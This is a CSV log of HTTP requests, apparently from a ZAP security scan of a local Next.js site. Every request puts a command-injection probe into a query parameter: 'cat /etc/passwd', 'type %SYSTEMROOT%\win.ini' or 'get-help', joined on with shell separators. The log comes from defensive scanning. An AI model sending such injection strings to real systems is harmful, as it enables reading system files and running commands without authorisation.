ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
1704,Fri Sep 25 14:40:28 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=1790326852495%3Bget-help,200,OK,66,327,71262
1705,Fri Sep 25 14:40:28 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,30,315,25931
1706,Fri Sep 25 14:40:27 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=cat+%2Fetc%2Fpasswd,200,OK,1144,345,11938274
1707,Fri Sep 25 14:40:28 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=1790326852495%22%3Bget-help,200,OK,70,342,142828
1708,Fri Sep 25 14:40:28 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=1790326852495%22%3Bget-help,200,OK,74,327,71262
1709,Fri Sep 25 14:40:28 IST 2026,Fri Sep 25 14:40:28 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=get-help,200,OK,52,315,25931
1710,Fri Sep 25 14:40:27 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/about?_rsc=cat+%2Fetc%2Fpasswd,200,OK,2024,303,3854
1711,Fri Sep 25 14:40:27 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/contact?_rsc=cat+%2Fetc%2Fpasswd,200,OK,1990,303,3866
1712,Fri Sep 25 14:40:27 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/faq?_rsc=cat+%2Fetc%2Fpasswd,200,OK,1924,303,3842
1713,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%26cat+%2Fetc%2Fpasswd%26,200,OK,77,303,3854
1714,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%26cat+%2Fetc%2Fpasswd%26,200,OK,104,303,3866
1715,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%26cat+%2Fetc%2Fpasswd%26,200,OK,124,303,3842
1716,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Bget-help,200,OK,138,315,25931
1717,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,106,303,3854
1718,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,125,303,3866
1719,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,136,303,3842
1720,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=1790326852495%27%3Bget-help,200,OK,270,342,142828
1721,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=1790326852495%27%3Bget-help,200,OK,289,327,71262
1722,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%22%3Bget-help,200,OK,157,315,25931
1723,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,151,303,3854
1724,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:29 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,132,303,3866
1725,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,130,303,3842
1726,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,106,303,3854
1727,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,110,303,3866
1728,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,109,303,3842
1729,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%27%3Bget-help,200,OK,198,315,25931
1730,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=1790326852495%3Bget-help+%23,200,OK,220,327,71262
1731,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,115,303,3854
1732,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,109,303,3866
1733,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,102,303,3842
1734,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=1790326852495%3Bget-help+%23,200,OK,289,342,142828
1735,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Bget-help+%23,200,OK,102,315,25931
1736,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,88,303,3854
1737,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,90,303,3866
1738,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,100,303,3842
1739,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/about?_rsc=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,98,303,3854
1740,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/contact?_rsc=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,93,303,3866
1741,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,89,303,3842
1742,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,150,303,3854
1743,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,159,303,3866
1744,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:30 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,200,303,3842
1745,Fri Sep 25 14:40:29 IST 2026,Fri Sep 25 14:40:32 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%26cat+%2Fetc%2Fpasswd%26,200,OK,3175,345,11938274
1746,Fri Sep 25 14:40:27 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/images,404,Not Found,5588,341,9946
1747,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,500,Internal Server Error,2547,377,4773
1748,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,500,Internal Server Error,2613,376,4789
1749,Fri Sep 25 14:40:30 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,500,Internal Server Error,2651,376,4781
1750,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,65,303,3842
1751,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,114,303,3866
1752,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,140,303,3854
1753,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/login?_rsc=cat+%2Fetc%2Fpasswd,200,OK,165,303,3854
1754,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:33 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,180,303,3842
1755,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,283,303,3866
1756,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,383,303,3854
1757,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%26cat+%2Fetc%2Fpasswd%26,200,OK,359,303,3854
1758,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,331,303,3842
1759,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,257,303,3866
1760,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/register?confirmPassword=cat+%2Fetc%2Fpasswd&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,567,335,18929
1761,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,150,303,3854
1762,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,147,303,3854
1763,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,142,303,3842
1764,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,136,303,3866
1765,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,153,303,3854
1766,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,150,303,3854
1767,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=get-help,200,OK,170,303,3842
1768,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=get-help,200,OK,173,303,3866
1769,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=get-help,200,OK,153,303,3854
1770,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,149,303,3854
1771,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%26cat+%2Fetc%2Fpasswd%26&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,370,335,18977
1772,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%3Bget-help,200,OK,130,303,3842
1773,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%3Bget-help,200,OK,128,303,3866
1774,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%3Bget-help,200,OK,119,303,3854
1775,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,129,303,3854
1776,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%3Bget-help,200,OK,151,303,3842
1777,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%3Bget-help,200,OK,150,303,3866
1778,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%3Bget-help,200,OK,173,303,3854
1779,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,172,303,3854
1780,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%3Bget-help,200,OK,142,303,3842
1781,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%3Bget-help,200,OK,142,303,3866
1782,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,354,335,18957
1783,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%3Bget-help,200,OK,127,303,3854
1784,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,119,303,3854
1785,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%3Bget-help+%23,200,OK,125,303,3842
1786,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%3Bget-help+%23,200,OK,131,303,3866
1787,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%3Bget-help+%23,200,OK,176,303,3854
1788,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,183,303,3854
1789,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,257,335,19013
1790,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,49,303,3854
1791,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,77,303,3854
1792,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,118,335,18993
1793,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,38,303,3854
1794,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,79,303,3854
1795,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,113,335,18989
1796,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,37,303,3854
1797,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=get-help,200,OK,66,303,3854
1798,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bget-help,200,OK,54,303,3854
1799,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,157,335,18969
1800,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%3Bget-help,200,OK,40,303,3854
1801,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%3Bget-help,200,OK,129,303,3854
1802,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=type+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,173,335,18983
1803,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bget-help+%23,200,OK,62,303,3854
1804,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,136,335,19013
1805,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,162,335,19003
1806,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,61,335,19067
1807,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,67,335,19021
1808,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,19043
1809,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,19009
1810,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=get-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18891
1811,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18911
1812,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18929
1813,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18917
1814,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bget-help+%23&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18925
1815,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=cat+%2Fetc%2Fpasswd&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18861
1816,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%26cat+%2Fetc%2Fpasswd%26&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,18977
1817,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bcat+%2Fetc%2Fpasswd%3B&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,50,335,18957
1818,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,3207,345,11938274
1819,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%26cat+%2Fetc%2Fpasswd%26%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,90,335,19013
1820,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%3Bcat+%2Fetc%2Fpasswd%3B%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18993
1821,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%26cat+%2Fetc%2Fpasswd%26%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18989
1822,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%3Bcat+%2Fetc%2Fpasswd%3B%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,18969
1823,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=type+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18915
1824,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%26type+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19013
1825,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,61,335,19003
1826,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,19067
1827,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,19021
1828,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,55,335,19043
1829,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19009
1830,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=get-help&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18823
